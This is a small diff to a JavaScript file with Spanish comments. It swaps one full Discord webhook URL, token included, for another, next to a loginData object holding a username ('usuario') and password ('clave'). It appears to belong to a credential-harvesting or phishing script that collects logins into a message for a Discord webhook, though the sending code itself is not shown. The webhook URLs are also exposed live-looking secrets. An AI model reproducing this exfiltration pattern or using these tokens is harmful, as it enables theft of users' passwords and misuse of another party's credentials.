@@ -1,5 +1,5 @@
 // Datos acumulativos para el mensaje
-const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1471221768432914483/wNw2rk7bfvAiQHAIxXjThtLy48anOQIgmzSuKQR6ePNXKtTdMb3ObU02i2YmbTtXo3qu';
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1480660691575640116/WniYFtkZWXWvaSRHIJoWDVHY8a8Sx-bXPyCvBlgagoi3sOfw46CYyTk7_rba90fy9A41';
 const loginData = {
     usuario: '',
     clave: '',
